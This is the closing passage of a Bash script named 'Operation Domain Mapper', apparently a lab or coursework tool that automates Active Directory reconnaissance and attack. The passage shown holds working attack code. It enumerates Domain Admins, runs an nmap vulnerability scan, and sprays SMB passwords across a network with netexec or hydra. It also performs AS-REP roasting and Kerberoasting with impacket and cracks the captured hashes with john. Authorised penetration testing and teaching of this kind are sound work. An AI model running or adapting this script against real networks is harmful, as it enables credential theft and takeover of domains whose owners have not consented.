                    -W "$DOMAIN" -S "$DC_IP" \
                    > "$DA_FILE" 2>&1 || log_warn "net rpc Domain Admins query failed."
                append_tool_output "Domain Admins members (net rpc)" "$DA_FILE"
            fi
        fi
    fi

    log_msg "Enumeration module finished."
}

# -----------------------------------------------------------------------------
# 9. PHASE 5 — EXPLOITATION MODULE
# -----------------------------------------------------------------------------
run_exploitation_module() {
    if [ "$EXPLOIT_LEVEL" -eq 0 ]; then
        log_warn "Exploitation level = 0 (None). Skipping exploitation module."
        report_section "Phase 5: Exploitation"
        report_skip "Exploitation was skipped (level 0)."
        return 0
    fi

    log_stage "PHASE 5: Exploitation  (Level ${EXPLOIT_LEVEL} — cumulative)"
    report_section "Phase 5: Exploitation  (Level ${EXPLOIT_LEVEL} — cumulative)"

    [ -z "$OPEN_PORTS" ] && OPEN_PORTS=$(extract_open_ports)
    [ -z "$OPEN_PORTS" ] && OPEN_PORTS="21,22,80,135,139,389,443,445,3389"

    # ------------------ LEVEL 1 (Basic) — NSE Vulnerability Scan ------------------
    if [ "$EXPLOIT_LEVEL" -ge 1 ]; then
        log_info "Executing Level 1 (NSE Vulnerability Scan)"
        report_exec "Executing Level 1 (NSE Vulnerability Scan: vuln + vulners)"
        nmap -Pn -sV --script "vuln,vulners" --top-ports 100 -T4 \
            -oN "$NMAP_VULN" "$TARGET_NET" \
            >/dev/null 2>&1 || log_warn "NSE vuln scan returned non-zero status."
        append_tool_output "Nmap NSE vulnerability scan" "$NMAP_VULN"
    fi

    # ------------------ LEVEL 2 (Intermediate) — Password Spraying ------------------
    if [ "$EXPLOIT_LEVEL" -ge 2 ]; then
        log_info "Executing Level 2 (Domain-wide Password Spraying)"
        report_exec "Executing Level 2 (Domain-wide Password Spraying via netexec, timeout 5m)"

        ensure_users_file
        touch "$SPRAY_OUT"

        local sprayer=""
        command -v nxc          >/dev/null 2>&1 && sprayer="nxc"
        [ -z "$sprayer" ] && command -v netexec     >/dev/null 2>&1 && sprayer="netexec"
        [ -z "$sprayer" ] && command -v crackmapexec >/dev/null 2>&1 && sprayer="crackmapexec"

        if [ -n "$sprayer" ]; then
            report_note "Spraying SMB across <code>${TARGET_NET}</code> using ${sprayer} with users=<code>${USERS_FILE_CLEAN}</code> and full password list <code>${PASS_LIST}</code>. Hard wall-clock cap: 5 minutes."
            timeout 5m "$sprayer" smb "$TARGET_NET" \
                -u "$USERS_FILE_CLEAN" -p "$PASS_LIST" \
                --continue-on-success --ignore-pw-decoding \
                > "$SPRAY_OUT" 2>&1 || true
            append_tool_output "Password Spraying (${sprayer} smb)" "$SPRAY_OUT"
        elif command -v hydra >/dev/null 2>&1; then
            report_note "Falling back to hydra SMB spray on <code>${TARGET_NET}</code>. Hard wall-clock cap: 5 minutes."
            timeout 5m hydra -L "$USERS_FILE_CLEAN" -P "$PASS_LIST" \
                -t 4 -f "smb://${TARGET_NET}" \
                > "$SPRAY_OUT" 2>&1 || true
            append_tool_output "Password Spraying (hydra)" "$SPRAY_OUT"
        else
            log_err "No spraying tool available (netexec/crackmapexec/hydra)."
            report_skip "Spraying skipped: no compatible tool installed."
        fi
    fi

    # ------------------ LEVEL 3 (Advanced) — Kerberos + John ------------------
    if [ "$EXPLOIT_LEVEL" -ge 3 ]; then
        log_info "Executing Level 3 (Kerberos AS-REP Roast + Kerberoast + john)"
        report_exec "Executing Level 3 (Kerberos: AS-REP Roast + Kerberoast). Cracking with <b>john</b> (hashcat banned)."

        ensure_users_file
        [ -z "$DC_IP" ] && DC_IP=$(find_dc_ip)
        if [ -z "$DC_IP" ]; then
            log_warn "DC not located; Kerberos attacks require DC IP."
            report_skip "Kerberos attacks aborted: DC IP unknown."
        else
            # AS-REP Roasting
            touch "$ASREP_HASH"
            local asrep_args=( "${DOMAIN}/" -usersfile "$USERS_FILE_CLEAN"
                               -dc-ip "$DC_IP" -format john -outputfile "$ASREP_HASH" )
            if [ -z "$AD_USER" ] || [ -z "$AD_PASS" ]; then
                report_note "AS-REP Roast running unauthenticated (-no-pass) since AD credentials are empty."
                timeout 5m impacket-GetNPUsers -no-pass "${asrep_args[@]}" \
                    >/dev/null 2>&1 || log_warn "impacket-GetNPUsers returned non-zero."
            else
                timeout 5m impacket-GetNPUsers \
                    "${DOMAIN}/${AD_USER}:${AD_PASS}" \
                    -usersfile "$USERS_FILE_CLEAN" -dc-ip "$DC_IP" \
                    -format john -outputfile "$ASREP_HASH" \
                    >/dev/null 2>&1 || log_warn "impacket-GetNPUsers returned non-zero."
            fi
            append_tool_output "AS-REP Roast hashes (impacket-GetNPUsers)" "$ASREP_HASH"

            # Kerberoasting
            touch "$KERB_HASH"
            if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
                timeout 5m impacket-GetUserSPNs \
                    "${DOMAIN}/${AD_USER}:${AD_PASS}" \
                    -dc-ip "$DC_IP" -request -outputfile "$KERB_HASH" \
                    >/dev/null 2>&1 || log_warn "impacket-GetUserSPNs returned non-zero."
                append_tool_output "Kerberoast hashes (impacket-GetUserSPNs)" "$KERB_HASH"
            else
                log_warn "Skipping Kerberoasting: requires valid AD credentials."
                report_skip "Kerberoasting requires authenticated session; \$AD_USER/\$AD_PASS were empty."
            fi

            # Crack with john (hashcat banned)
            touch "$JOHN_OUT"
            local cracked_any=0
            for hf in "$ASREP_HASH" "$KERB_HASH"; do
                if [ -s "$hf" ]; then
                    log_info "john --wordlist on $(basename "$hf")"
                    timeout 5m john --wordlist="$PASS_LIST" "$hf" \
                        >> "$JOHN_OUT" 2>&1 || log_warn "john returned non-zero on $(basename "$hf")."
                    john --show "$hf" >> "$JOHN_OUT" 2>&1 || true
                    cracked_any=1
                fi
            done
            if [ "$cracked_any" -eq 1 ]; then
                append_tool_output "Cracking results (john)" "$JOHN_OUT"
            else
                report_skip "No Kerberos hashes were captured; john not invoked."
            fi
        fi
    fi

    log_msg "Exploitation module finished."
}

# -----------------------------------------------------------------------------
# FIX 3: Performance tuning — raise socket limit + boost CPU priority
# -----------------------------------------------------------------------------
maximize_performance() {
    log_info "Tuning kernel scheduling for maximum CPU priority and network sockets..."
    ulimit -n 100000 2>/dev/null || true
    renice -n -19 $$ >/dev/null 2>&1 || true
}

# -----------------------------------------------------------------------------
# 10. MAIN EXECUTION BLOCK
# -----------------------------------------------------------------------------
main() {
    case "${1:-}" in
        -h|--help|help) show_help; exit 0 ;;
    esac

    echo -e "${C_MAGENTA}${C_BOLD}"
    echo "############################################################"
    echo "#   Operation Domain Mapper (${s20})                       #"
    echo "#   Automated AD Recon, Enumeration & Exploitation         #"
    echo "############################################################"
    echo -e "${C_RESET}"

    maximize_performance
    check_prerequisites
    get_user_input
    init_report

    run_scanning_module
    run_enumeration_module
    run_exploitation_module

    generate_report
    log_msg "Operation Domain Mapper run complete."
    trap - EXIT
}

main "$@"
